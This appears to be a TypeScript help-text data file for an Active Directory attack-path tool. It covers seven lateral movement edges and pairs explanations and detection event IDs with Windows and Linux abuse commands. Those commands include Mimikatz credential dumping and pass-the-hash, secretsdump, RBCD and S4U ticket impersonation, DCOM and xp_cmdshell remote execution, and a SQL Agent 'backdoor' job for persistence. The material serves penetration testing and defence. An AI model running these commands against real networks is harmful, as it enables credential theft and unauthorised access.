import type { EdgeHelpText } from './types';

export const adLateralMovementEdges: EdgeHelpText[] = [
  {
    kind: 'AdminTo',
    category: 'Lateral Movement',
    general:
      'The AdminTo edge indicates that a principal has local administrator privileges on a target computer. This is determined by membership in the local Administrators group on the target machine, either directly or through nested group membership. Local admin access enables credential harvesting, lateral movement via PsExec/WMI/SMB, and full control over the target system including the ability to dump LSASS and extract cached credentials.',
    windowsAbuse: `# Remote code execution via PsExec (Sysinternals)
PsExec.exe \\\\target.domain.local -accepteula -s cmd.exe

# Remote code execution via WMI
wmic /node:target.domain.local process call create "cmd.exe /c whoami > C:\\temp\\out.txt"

# Using PowerView to verify local admin access
Test-AdminAccess -ComputerName target.domain.local

# Using Mimikatz for credential harvesting after gaining access
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Pass-the-Hash with Mimikatz
mimikatz # sekurlsa::pth /user:admin /domain:domain.local /ntlm:<hash> /run:cmd.exe`,
    linuxAbuse: `# Using impacket PsExec for remote code execution
psexec.py domain.local/attacker:'Password'@target.domain.local

# Using impacket WMIExec
wmiexec.py domain.local/attacker:'Password'@target.domain.local

# Using impacket SMBExec
smbexec.py domain.local/attacker:'Password'@target.domain.local

# Pass-the-Hash with impacket
psexec.py -hashes :NTHASH domain.local/attacker@target.domain.local

# Using CrackMapExec for mass lateral movement
crackmapexec smb target.domain.local -u attacker -p 'Password' --exec-method smbexec -x 'whoami'

# Dump credentials after gaining access
secretsdump.py domain.local/attacker:'Password'@target.domain.local`,
    opsec:
      'Lateral movement via PsExec creates a service on the target (Event ID 7045 - A new service was installed, and Event ID 4697 - A service was installed in the system). WMI execution generates Event ID 4688 (A new process was created) with the parent process being WmiPrvSE.exe. All methods generate Event ID 4624 (Logon) type 3 (Network logon) on the target. Pass-the-Hash generates Event ID 4624 with LogonType 9 (NewCredentials) on the source and NTLM authentication events. Monitor for Event ID 4648 (Explicit credentials) which indicates lateral movement.',
    references: [
      {
        title: 'BloodHound Documentation - AdminTo',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312762532123-AdminTo',
      },
      {
        title: 'adsecurity.org - Local Admin Access',
        url: 'https://adsecurity.org/?p=2362',
      },
      {
        title: 'The Hacker Recipes - Lateral Movement',
        url: 'https://www.thehacker.recipes/ad/movement/lateral-movement',
      },
    ],
  },
  {
    kind: 'AllowedToAct',
    category: 'Lateral Movement',
    general:
      'The AllowedToAct edge indicates that a principal is allowed to perform Resource-Based Constrained Delegation (RBCD) to the target computer. This is controlled by the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target computer object. RBCD enables a principal to impersonate any user (except those in the Protected Users group or marked as sensitive) to any service on the target computer. This is a powerful lateral movement primitive because it only requires write access to the target computer object to configure.',
    windowsAbuse: `# Step 1: If you control a computer account (or can create one via MachineAccountQuota)
# Create a new machine account using PowerMad
New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Step 2: Get the SID of the controlled computer account
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid

# Step 3: Build the security descriptor
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Step 4: Set the RBCD attribute on the target
Set-DomainObject -Identity targetcomputer$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 5: Get the hash of the controlled computer account
Rubeus.exe hash /password:Password123!

# Step 6: Perform S4U to get a ticket as admin to the target
Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt`,
    linuxAbuse: `# Step 1: Create a machine account (if MachineAccountQuota > 0)
addcomputer.py -computer-name 'FAKECOMPUTER$' -computer-pass 'Password123!' -dc-ip 10.0.0.1 domain.local/attacker:'Password'

# Step 2: Configure RBCD using bloodyAD
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local add rbcd 'targetcomputer$' 'FAKECOMPUTER$'

# Or using impacket's rbcd.py
rbcd.py -delegate-from 'FAKECOMPUTER$' -delegate-to 'targetcomputer$' -action write domain.local/attacker:'Password'

# Step 3: Get a TGT for the fake computer
getTGT.py domain.local/'FAKECOMPUTER$':'Password123!' -dc-ip 10.0.0.1

# Step 4: Perform S4U2Self + S4U2Proxy to impersonate admin
getST.py -spn cifs/target.domain.local -impersonate administrator -dc-ip 10.0.0.1 domain.local/'FAKECOMPUTER$':'Password123!'

# Step 5: Use the ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass target.domain.local`,
    opsec:
      'RBCD configuration changes are logged under Event ID 5136 (A directory service object was modified) when the msDS-AllowedToActOnBehalfOfOtherIdentity attribute is changed. The S4U2Self and S4U2Proxy exchanges generate Event ID 4769 (TGS requested) on the Domain Controller. Machine account creation via MachineAccountQuota generates Event ID 4741 (A computer account was created). Monitor for new computer accounts created by non-admin users and unexpected modifications to the RBCD attribute.',
    references: [
      {
        title: 'BloodHound Documentation - AllowedToAct',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312764579099-AllowedToAct',
      },
      {
        title: 'SpecterOps - Delegation Abuse',
        url: 'https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a',
      },
      {
        title: 'The Hacker Recipes - RBCD',
        url: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd',
      },
    ],
  },
  {
    kind: 'AllowedToDelegate',
    category: 'Lateral Movement',
    general:
      'The AllowedToDelegate edge indicates that a principal has Constrained Delegation configured to a specific service on a target computer. This is controlled by the msDS-AllowedToDelegateTo attribute on the source principal. Constrained Delegation allows the source to request service tickets on behalf of any user (via S4U2Proxy) to the specified service principal names. If protocol transition is enabled (TrustedToAuthForDelegation), the source can also use S4U2Self to obtain a forwardable ticket for any user without needing their credentials.',
    windowsAbuse: `# Enumerate constrained delegation using PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# If you control the delegating account with protocol transition:
# Step 1: Get a TGT for the delegating account
Rubeus.exe asktgt /user:svcaccount /rc4:<hash> /outfile:svc.kirbi

# Step 2: S4U2Self to get a ticket as the target user, then S4U2Proxy to the target service
Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt

# Alternate SPN abuse: the SPN in the ticket can be changed since the service name is not in the encrypted part
Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:administrator /msdsspn:cifs/target.domain.local /altservice:ldap/target.domain.local /ptt`,
    linuxAbuse: `# Enumerate constrained delegation
findDelegation.py domain.local/attacker:'Password' -dc-ip 10.0.0.1

# If you have credentials for the delegating account with protocol transition:
getST.py -spn cifs/target.domain.local -impersonate administrator -dc-ip 10.0.0.1 domain.local/svcaccount:'Password'

# Alternate service name abuse
getST.py -spn cifs/target.domain.local -impersonate administrator -altservice ldap -dc-ip 10.0.0.1 domain.local/svcaccount:'Password'

# Use the resulting ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass target.domain.local`,
    opsec:
      'S4U2Self and S4U2Proxy operations generate Event ID 4769 (TGS requested) on the Domain Controller. The constrained delegation request will show the delegating principal requesting a ticket on behalf of another user. Monitor for Event ID 4768 (TGT requested) with pre-authentication types associated with S4U. Alternate service name abuse is particularly stealthy since the SPN can be changed post-issuance without additional logging. Look for service tickets requested by accounts configured for constrained delegation where the target service does not match the msDS-AllowedToDelegateTo attribute.',
    references: [
      {
        title: 'BloodHound Documentation - AllowedToDelegate',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312766018203-AllowedToDelegate',
      },
      {
        title: 'SpecterOps - S4U2Pwnage',
        url: 'https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1',
      },
      {
        title: 'The Hacker Recipes - Constrained Delegation',
        url: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained',
      },
      {
        title: 'HackTricks - Constrained Delegation',
        url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html',
      },
    ],
  },
  {
    kind: 'CanPSRemote',
    category: 'Lateral Movement',
    general:
      'The CanPSRemote edge indicates that a principal can establish a PowerShell Remoting session (WinRM) to the target computer. This is typically granted through membership in the Remote Management Users local group or the local Administrators group. PowerShell Remoting provides a full interactive PowerShell session on the target, making it a powerful lateral movement vector. WinRM uses HTTP (5985) or HTTPS (5986) and supports both NTLM and Kerberos authentication.',
    windowsAbuse: `# Establish a PowerShell Remoting session
Enter-PSSession -ComputerName target.domain.local

# Execute commands remotely without an interactive session
Invoke-Command -ComputerName target.domain.local -ScriptBlock { whoami; hostname }

# Run a script remotely
Invoke-Command -ComputerName target.domain.local -FilePath C:\\tools\\script.ps1

# Using credentials explicitly
$cred = New-Object System.Management.Automation.PSCredential('domain\\attacker', (ConvertTo-SecureString 'Password' -AsPlainText -Force))
Enter-PSSession -ComputerName target.domain.local -Credential $cred

# Using PowerShell Remoting with Pass-the-Hash (requires NTLM)
# First use Mimikatz to inject credentials
mimikatz # sekurlsa::pth /user:attacker /domain:domain.local /ntlm:<hash> /run:powershell.exe
# Then from the new PowerShell window:
Enter-PSSession -ComputerName target.domain.local`,
    linuxAbuse: `# Using Evil-WinRM for PowerShell Remoting from Linux
evil-winrm -i target.domain.local -u attacker -p 'Password'

# Using Evil-WinRM with Pass-the-Hash
evil-winrm -i target.domain.local -u attacker -H <NTHASH>

# Using impacket (limited PowerShell capability but works for command execution)
# WinRM is not directly supported by impacket, but you can use:
# 1. CrackMapExec with WinRM
crackmapexec winrm target.domain.local -u attacker -p 'Password' -x 'whoami'

# 2. Or use Kerberos auth with Evil-WinRM
getTGT.py domain.local/attacker:'Password' -dc-ip 10.0.0.1
export KRB5CCNAME=attacker.ccache
evil-winrm -i target.domain.local -r domain.local`,
    opsec:
      'PowerShell Remoting generates Event ID 4624 (Logon) type 3 (Network) on the target system. WinRM activity is logged in the Microsoft-Windows-WinRM/Operational log, including Event ID 91 (Creating WSMan Session) and Event ID 6 (WSMan Session completed). PowerShell script execution is logged under Event ID 4104 (Script Block Logging) and Event ID 4103 (Module Logging) if enabled. Event ID 4648 (Explicit credentials) may be generated on the source if alternate credentials are used.',
    references: [
      {
        title: 'BloodHound Documentation - CanPSRemote',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312773072283-CanPSRemote',
      },
      {
        title: 'HackTricks - WinRM',
        url: 'https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html',
      },
    ],
  },
  {
    kind: 'CanRDP',
    category: 'Lateral Movement',
    general:
      'The CanRDP edge indicates that a principal can establish a Remote Desktop Protocol session to the target computer. This is typically granted through membership in the Remote Desktop Users local group or the local Administrators group. RDP provides a full graphical interactive session, making it useful for lateral movement and allows access to any applications and data on the target. RDP sessions may also expose cached credentials in memory if other users are logged in.',
    windowsAbuse: `# Standard RDP connection
mstsc /v:target.domain.local

# Using cmdkey to save credentials for RDP
cmdkey /generic:target.domain.local /user:domain\\attacker /pass:Password
mstsc /v:target.domain.local

# Restricted Admin Mode RDP (Pass-the-Hash for RDP)
# First, enable Restricted Admin on the target (requires admin):
# reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
# Then connect via Mimikatz PTH:
mimikatz # sekurlsa::pth /user:admin /domain:domain.local /ntlm:<hash> /run:"mstsc /restrictedadmin /v:target.domain.local"

# SharpRDP for authenticated RDP command execution without GUI
SharpRDP.exe computername=target.domain.local command="powershell -enc <base64>" username=domain\\attacker password=Password`,
    linuxAbuse: `# Using xfreerdp for RDP from Linux
xfreerdp /v:target.domain.local /u:attacker /p:'Password' /d:domain.local

# Pass-the-Hash with xfreerdp (Restricted Admin must be enabled on target)
xfreerdp /v:target.domain.local /u:attacker /pth:<NTHASH> /d:domain.local

# Using Remmina (GUI-based RDP client)
remmina -c rdp://attacker@target.domain.local

# Using CrackMapExec to check RDP access
crackmapexec rdp target.domain.local -u attacker -p 'Password'`,
    opsec:
      'RDP connections generate Event ID 4624 (Logon) type 10 (Remote Interactive) on the target. Event ID 4778 (A session was reconnected) and 4779 (A session was disconnected) track session activity. The Microsoft-Windows-TerminalServices-LocalSessionManager/Operational log records Event ID 21 (Session logon succeeded) and Event ID 25 (Session reconnection succeeded). RDP connections are highly visible and commonly monitored. NLA (Network Level Authentication) failures generate Event ID 4625. The source IP is always recorded in the logon events.',
    references: [
      {
        title: 'BloodHound Documentation - CanRDP',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312774482459-CanRDP',
      },
      {
        title: 'The Hacker Recipes - RDP',
        url: 'https://www.thehacker.recipes/ad/movement/lateral-movement/rdp',
      },
    ],
  },
  {
    kind: 'ExecuteDCOM',
    category: 'Lateral Movement',
    general:
      'The ExecuteDCOM edge indicates that a principal can execute code on a target computer via Distributed Component Object Model (DCOM). DCOM allows software components to communicate across a network. Certain DCOM objects (such as MMC20.Application, ShellWindows, ShellBrowserWindow, and ExcelDDE) expose methods that can be leveraged for remote code execution. This typically requires local administrator privileges on the target. DCOM uses TCP port 135 for initial endpoint mapping and dynamic high ports for the actual communication.',
    windowsAbuse: `# Using MMC20.Application DCOM object for lateral movement
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "target.domain.local"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")

# Using ShellWindows DCOM object
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "target.domain.local"))
$com.item().Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\\temp\\out.txt", "C:\\Windows\\System32", $null, 0)

# Using ShellBrowserWindow DCOM object
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "target.domain.local"))
$com.Document.Application.ShellExecute("cmd.exe", "/c whoami", "", "", 0)`,
    linuxAbuse: `# Using impacket's dcomexec.py
dcomexec.py domain.local/attacker:'Password'@target.domain.local 'whoami'

# Specify the DCOM object to use
dcomexec.py -object MMC20 domain.local/attacker:'Password'@target.domain.local 'whoami'
dcomexec.py -object ShellWindows domain.local/attacker:'Password'@target.domain.local 'whoami'
dcomexec.py -object ShellBrowserWindow domain.local/attacker:'Password'@target.domain.local 'whoami'

# Pass-the-Hash with dcomexec
dcomexec.py -hashes :NTHASH domain.local/attacker@target.domain.local 'whoami'`,
    opsec:
      'DCOM execution generates Event ID 4624 (Logon) type 3 (Network) on the target. Process creation is logged under Event ID 4688 with the parent process typically being svchost.exe or mmc.exe depending on the DCOM object used. DCOM connections use TCP port 135 for endpoint mapping, followed by dynamic high ports. The Microsoft-Windows-DistributedCOM/Operational log records DCOM activity. DCOM lateral movement can be stealthier than PsExec since it does not create a service, but the unusual parent-child process relationships (e.g., mmc.exe spawning cmd.exe) can be detected by EDR solutions.',
    references: [
      {
        title: 'BloodHound Documentation - ExecuteDCOM',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312792944539-ExecuteDCOM',
      },
      {
        title: 'SpecterOps - DCOM Lateral Movement',
        url: 'https://posts.specterops.io/lateral-movement-using-dcom-objects-39855be0e8de',
      },
      {
        title: 'The Hacker Recipes - DCOM',
        url: 'https://www.thehacker.recipes/ad/movement/lateral-movement/dcom',
      },
    ],
  },
  {
    kind: 'SQLAdmin',
    category: 'Lateral Movement',
    general:
      'The SQLAdmin edge indicates that a principal has sysadmin privileges on an MSSQL server instance running on the target computer. SQL Server sysadmin access enables command execution on the underlying operating system via xp_cmdshell, file system access, and the ability to impersonate other SQL logins. MSSQL instances often run as high-privilege service accounts, making SQL injection or SQL login compromise a viable path to local admin on the host. SQL Server also supports linked servers which can chain access across multiple SQL instances.',
    windowsAbuse: `# Connect to SQL Server and enable xp_cmdshell
# Using sqlcmd
sqlcmd -S target.domain.local -Q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

# Execute OS commands via xp_cmdshell
sqlcmd -S target.domain.local -Q "EXEC xp_cmdshell 'whoami'"

# Using PowerUpSQL for enumeration and exploitation
Import-Module PowerUpSQL
Get-SQLInstanceDomain | Get-SQLServerInfo
Invoke-SQLOSCmd -Instance target.domain.local -Command "whoami"

# Enumerate linked servers
Get-SQLServerLinkCrawl -Instance target.domain.local

# Execute through linked server chain
sqlcmd -S target.domain.local -Q "EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT LinkedServer2') AT LinkedServer1"

# Use SQL Server agent jobs for persistence
sqlcmd -S target.domain.local -Q "USE msdb; EXEC sp_add_job @job_name='backdoor'; EXEC sp_add_jobstep @job_name='backdoor', @step_name='step1', @subsystem='CmdExec', @command='whoami > C:\\temp\\out.txt'; EXEC sp_add_jobserver @job_name='backdoor'; EXEC sp_start_job @job_name='backdoor';"`,
    linuxAbuse: `# Using impacket's mssqlclient.py
mssqlclient.py domain.local/attacker:'Password'@target.domain.local -windows-auth

# Enable and use xp_cmdshell
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

# Using CrackMapExec for MSSQL
crackmapexec mssql target.domain.local -u attacker -p 'Password' -x 'whoami'

# Enumerate linked servers via impacket
SQL> enum_links
SQL> use_link LinkedServer1
SQL> xp_cmdshell whoami`,
    opsec:
      'SQL Server activity is logged in the SQL Server error log and can be configured for auditing via SQL Server Audit. Enabling xp_cmdshell generates an entry in the SQL Server error log. OS commands executed via xp_cmdshell generate Event ID 4688 (Process creation) with the parent process being sqlservr.exe. Event ID 4624 (Logon) type 3 (Network) is generated for SQL connections using Windows authentication. SQL Server login failures generate Event ID 18456 in the SQL Server error log. Monitor for unusual processes spawned by sqlservr.exe as this is a strong indicator of SQL-based lateral movement.',
    references: [
      {
        title: 'BloodHound Documentation - SQLAdmin',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312849474331-SQLAdmin',
      },
      {
        title: 'HackTricks - MSSQL',
        url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server.html',
      },
      {
        title: 'The Hacker Recipes - MSSQL',
        url: 'https://www.thehacker.recipes/ad/movement/lateral-movement/mssql',
      },
    ],
  },
];
